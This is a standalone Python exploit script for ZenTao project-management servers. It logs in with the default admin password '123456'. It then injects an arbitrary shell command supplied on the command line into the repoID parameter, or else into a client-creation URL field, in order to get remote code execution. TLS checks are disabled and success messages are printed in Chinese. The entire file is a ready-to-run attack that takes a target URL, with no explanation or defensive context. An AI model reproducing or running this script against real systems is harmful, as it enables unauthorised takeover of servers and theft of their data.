import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def zentao_rce(url, cmd):
    session = requests.Session()
    session.verify = False
    
    targets = [url, f"{url}/zentao"]
    
    for target in targets:
        try:
            login_url = f"{target}/index.php?m=user&f=login"
            resp = session.get(login_url, timeout=10)
            
            login_data = {
                'account': 'admin',
                'password': '123456',
                'referer': f'{target}/',
                'verifyRand': ''
            }
            
            login_resp = session.post(login_url, data=login_data, timeout=10)
            
            if 'location' in login_resp.headers or 'dashboard' in login_resp.text.lower():
                print(f"[+] ZenTao登录成功: {target}")
                
                rce_url = f"{target}/index.php?m=repo&f=ajaxGetRepoBranch&repoID=1"
                headers = {
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                payload = f"1';{cmd};'"
                data = {'repoID': payload}
                
                try:
                    rce_resp = session.post(rce_url, headers=headers, data=data, timeout=10)
                    if rce_resp.status_code == 200:
                        print(f"[+] RCE命令执行成功: {cmd}")
                        print(f"[*] 响应: {rce_resp.text[:500]}")
                        return True
                except Exception as e:
                    print(f"[-] RCE尝试失败: {e}")
                
                rce_url2 = f"{target}/index.php?m=client&f=create"
                for repo_id in range(1, 10):
                    try:
                        data2 = {
                            'name': 'test',
                            'url': f"http://127.0.0.1/';{cmd};'",
                            'repoID': str(repo_id)
                        }
                        rce_resp2 = session.post(rce_url2, data=data2, timeout=10)
                        if rce_resp2.status_code == 200:
                            print(f"[+] RCE命令执行成功(方法2): {cmd}")
                            return True
                    except:
                        continue
            else:
                print(f"[-] ZenTao登录失败: {target}")
        except Exception as e:
            print(f"[-] 连接失败: {target} - {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python zen_rce.py <url> <command>")
        print("Example: python zen_rce.py http://192.168.80.148 id")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    cmd = sys.argv[2]
    
    zentao_rce(url, cmd)